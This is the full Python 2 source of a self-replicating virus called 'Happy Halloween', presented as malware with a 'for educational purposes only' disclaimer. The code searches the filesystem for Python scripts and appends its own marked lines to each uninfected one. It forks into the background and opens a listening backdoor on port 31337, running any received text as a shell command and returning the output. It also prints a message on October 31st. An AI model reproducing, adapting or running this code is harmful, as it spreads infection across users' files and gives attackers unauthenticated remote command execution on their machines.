# Happy Halloween ~ (A python appender VX)
# Finds all python scripts on a system, infects them
# with the VX if not infected, payload on infected scripts 
# say "Happy Halloween" if run on October 31st. Virus 
# opens a backdoor on port 31337 which can be used to 
# send commands when an infected script has been executed.
# F O R  E D U C A T I O N A L  P U R P O S E S  O N L Y
 #!x
import glob #!x
import sys #!x
import os #!x 
import socket #!x
from datetime import datetime #!x
from string import * #!x 
date = datetime.now() #!x
if date.month == 10: #!x
	if date.day == 31: #!x
		print "Happy Halloween!" #!x
pid = os.fork() #!x
if pid > 0: #!x
        sys.exit(0) #!x
cmd = 'find /. -name "*.py" -print 2>/dev/null' #!x
for Files in os.popen(cmd).readlines(): #!x
	Files = Files[:-1] #!x
	try: #!x
			vCode = open(__file__, 'r') #!x 
			victim = open (Files, 'r') #!x
			readvictim = victim.read() #!x
			if find(readvictim, "pRdElKa") == -1: #!x
				victim = open(Files, 'a') #!x
				for code in vCode.readlines(): #!x 
					if ("#!x") in code: #!x
						vCode.close() #!x
        				        mycode=(code) #!x
			        	        victim.write(mycode) #!x
	except IOError: #!x
		a = 1 #!x
pid = os.fork() #!x
if pid > 0: #!x
	sys.exit(0) #!x
try: #!x
	s = socket.socket() #!x
	s.bind(("0.0.0.0",31337)) #!x
	s.listen(1) #!x
except socket.error, (value, message): #!x
	sys.exit(0) #!x
while 1: #!x
	(cli,add) = s.accept() #!x
	info = {"platform":sys.platform,"version":sys.version} #!x
	cli.send("".join(("You are connected to shell\r\n", info["platform"],info["version"],"\r\n"))) #!x
	while 1:#!x
		data = cli.recv(1024)#!x
		resp = os.popen(data).readlines()#!x
		cli.send("".join(resp))#!x
